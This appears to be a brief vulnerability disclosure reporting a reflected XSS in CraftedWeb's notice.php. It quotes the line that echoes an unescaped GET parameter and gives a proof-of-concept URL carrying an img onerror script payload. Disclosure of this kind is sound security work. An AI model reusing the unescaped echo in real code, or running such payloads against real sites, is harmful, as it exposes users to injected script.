### There is a XSS on the notice.php page

Powered by Shiyan 

##### Vulnerability analysis：

In the notice.php page, the wrong code was used, resulting in the existence of XSS vulnerability. 

##### Loophole code:

CraftedWeb//aasp_includes/pages/notice.php

Eleventh lines

```
<?php echo $_GET['e']; ?>
```

##### Reflected XSS PoC:

```
http://127.0.0.1/CraftedWeb//aasp_includes/pages/notice.php?e=1<img src=x onerror=alert('shiyan')>
```

##### Vulnerability trigger screenshot：

![1](C:\Users\lizhonghua\Desktop\新建文件夹\1\1.PNG)

Note: the vulnerability will be exploited by malicious users. 